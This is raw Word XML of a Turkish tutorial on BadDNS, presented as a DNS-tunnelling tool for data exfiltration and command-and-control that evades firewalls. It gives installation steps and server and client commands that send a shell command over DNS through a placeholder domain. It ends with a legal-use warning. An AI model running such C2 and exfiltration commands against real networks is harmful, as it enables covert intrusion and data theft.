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E4A64" w14:textId="77777777" w:rsidR="00F53E10" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="KonuBal"/>
      </w:pPr>
      <w:r>
        <w:t>BadDNS Aracı Nedir ve Nasıl Kullanılır?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A18CB0D" w14:textId="77777777" w:rsidR="00F53E10" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Balk1"/>
      </w:pPr>
      <w:r>
        <w:t>🧠 BadDNS Nedir?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14327AB5" w14:textId="77777777" w:rsidR="00F53E10" w:rsidRDefault="00000000">
      <w:r>
        <w:t>BadDNS, DNS (Domain Name System) protokolünü kullanarak hedef sistemde veri sızdırmak veya veri almak için kullanılan bir data exfiltration ve C2 (Command and Control) aracıdır. Özellikle güvenlik duvarlarıyla kısıtlanmış ortamlarda DNS tünelleme yoluyla iletişim sağlar.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F9A2215" w14:textId="77777777" w:rsidR="00F53E10" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Balk1"/>
      </w:pPr>
      <w:r>
        <w:t>🎯 Özellikleri</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="071A5F8A" w14:textId="77777777" w:rsidR="00F53E10" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- DNS protokolü üzerinden veri sızdırma (exfiltration)</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- Komut çalıştırma ve cevap alma (C2)</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- Python ile yazılmıştır</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- Tespit edilmesi zordur çünkü DNS trafiği genellikle engellenmez</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- Linux ve Windows sistemlerde çalışabilir</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- Firewall bypass ve veri kaçırma senaryolarında etkilidir</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19CFF7CB" w14:textId="77777777" w:rsidR="00F53E10" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Balk1"/>
      </w:pPr>
      <w:r>
        <w:t>⚙️ Kali Linux Üzerinde Kurulum</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="074B6477" w14:textId="77777777" w:rsidR="008738CD" w:rsidRDefault="00000000">
      <w:r>
        <w:t>1. Gerekli modülleri yükle:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>sudo apt update</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>sudo apt install python3 python3-pip git -y</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60564375" w14:textId="77777777" w:rsidR="008738CD" w:rsidRDefault="008738CD">
      <w:r w:rsidRPr="008738CD">
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="799AEFFD" wp14:editId="3ABDC3C3">
            <wp:extent cx="5077534" cy="1076475"/>
            <wp:effectExtent l="0" t="0" r="8890" b="9525"/>
            <wp:docPr id="131200289"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0289" name="Resim 1" descr="metin, ekran görüntüsü, yazı tipi içeren bir resim&#10;&#10;Yapay zeka tarafından oluşturulmuş içerik yanlış olabilir."/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId6"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5077534" cy="1076475"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CB6DB3E" w14:textId="6048B50B" w:rsidR="008738CD" w:rsidRDefault="00000000">
      <w:r>
        <w:br/>
        <w:t>2. BadDNS’i GitHub’dan indir:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>git clone https://github.com/m57/baddns.git</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>cd baddns</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r w:rsidR="008738CD" w:rsidRPr="008738CD">
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="14C44CAA" wp14:editId="14C17BB0">
            <wp:extent cx="3943900" cy="1066949"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="55335387"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5387" name="Resim 1" descr="metin, ekran görüntüsü, yazı tipi içeren bir resim&#10;&#10;Yapay zeka tarafından oluşturulmuş içerik yanlış olabilir."/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId7"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="3943900" cy="1066949"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AD03331" w14:textId="77777777" w:rsidR="008738CD" w:rsidRDefault="008738CD"/>
    <w:p w14:paraId="5A61E53C" w14:textId="04B516A6" w:rsidR="00F53E10" w:rsidRDefault="00000000">
      <w:r>
        <w:br/>
        <w:t>3. Python bağımlılıklarını yükle:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>pip3 install dnslib</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r w:rsidR="008738CD" w:rsidRPr="008738CD">
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="59494BC3" wp14:editId="65764154">
            <wp:extent cx="3229426" cy="714475"/>
            <wp:effectExtent l="0" t="0" r="0" b="9525"/>
            <wp:docPr id="591431827" name="Resim 1" descr="ekran görüntüsü, metin, yazı tipi,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31827" name="Resim 1" descr="ekran görüntüsü, metin, yazı tipi, grafik içeren bir resim&#10;&#10;Yapay zeka tarafından oluşturulmuş içerik yanlış olabilir."/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId8"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="3229426" cy="714475"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Not: Aracın tam çalışabilmesi için bir DNS sunucusu ve özel yapılandırılmış domain gerekebilir.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78A41B5D" w14:textId="77777777" w:rsidR="00F53E10" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Balk1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
        </w:rPr>
        <w:t>▶️</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Kullanım Örneği</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4ABAC68E" w14:textId="2CCF1A97" w:rsidR="00F53E10" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Sunucu tarafı:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>python3 baddns-server.py -d yourdomain.com -k secretkey</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r w:rsidR="008738CD" w:rsidRPr="008738CD">
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2AC1C68B" wp14:editId="4D467169">
            <wp:extent cx="5115639" cy="733527"/>
            <wp:effectExtent l="0" t="0" r="8890" b="9525"/>
            <wp:docPr id="935485467" name="Resim 1" descr="ekran görüntüsü, yazı tipi, grafik, grafik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85467" name="Resim 1" descr="ekran görüntüsü, yazı tipi, grafik, grafik tasarım içeren bir resim&#10;&#10;Yapay zeka tarafından oluşturulmuş içerik yanlış olabilir."/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId9"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5115639" cy="733527"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>İstemci tarafı:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>python3 baddns-client.py -d yourdomain.com -k secretkey -c "whoami"</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r w:rsidR="008738CD" w:rsidRPr="008738CD">
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="203BDFBC" wp14:editId="13BB34AC">
            <wp:extent cx="5486400" cy="828675"/>
            <wp:effectExtent l="0" t="0" r="0" b="9525"/>
            <wp:docPr id="1677955196" name="Resim 1" descr="ekran görüntüsü, yazı tipi,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55196" name="Resim 1" descr="ekran görüntüsü, yazı tipi, grafik içeren bir resim&#10;&#10;Yapay zeka tarafından oluşturulmuş içerik yanlış olabilir."/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId10"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5486400" cy="828675"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="53001179" w14:textId="11C0F66B" w:rsidR="00F53E10" w:rsidRDefault="00000000" w:rsidP="008738CD">
      <w:pPr>
        <w:pStyle w:val="Balk1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
        </w:rPr>
        <w:t>📟</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Örnek Terminal Çıktısı</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r w:rsidR="008738CD" w:rsidRPr="008738CD">
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="32BA3339" wp14:editId="108E1E38">
            <wp:extent cx="5486400" cy="1580515"/>
            <wp:effectExtent l="0" t="0" r="0" b="635"/>
            <wp:docPr id="1686414057"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14057" name="Resim 1" descr="metin, ekran görüntüsü, yazı tipi içeren bir resim&#10;&#10;Yapay zeka tarafından oluşturulmuş içerik yanlış olabilir."/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId11"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5486400" cy="1580515"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="44AB432C" w14:textId="77777777" w:rsidR="00F53E10" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Balk1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
        </w:rPr>
        <w:t>⚠️</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Dikkat</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="793CBE41" w14:textId="77777777" w:rsidR="00F53E10" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Bu araç yalnızca yasal izin alınmış ortamlarda kullanılmalıdır.</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- Gerçek sistemlerde izinsiz kullanımı suç teşkil edebilir.</w:t>
      </w:r>
    </w:p>
    <w:sectPr w:rsidR="00F53E10" w:rsidSect="00034616">
      <w:headerReference w:type="default" r:id="rI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30495517">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="1707412487">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="566186738">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="250820893">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="1359820146">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="1535389651">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="1309016175">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="1858931538">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="66250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022E"/>
    <w:rsid w:val="008738CD"/>
    <w:rsid w:val="00AA1D8D"/>
    <w:rsid w:val="00B47730"/>
    <w:rsid w:val="00CB0664"/>
    <w:rsid w:val="00F53E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0F2D3"/>
  <w14:defaultImageDpi w14:val="300"/>
  <w15:docId w15:val="{EF037913-18CF-404E-BB95-4B4D276A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2025-07-29T12:43:00Z</dcterms:modified>
  <cp:category/>
</cp:coreProperties>
</file>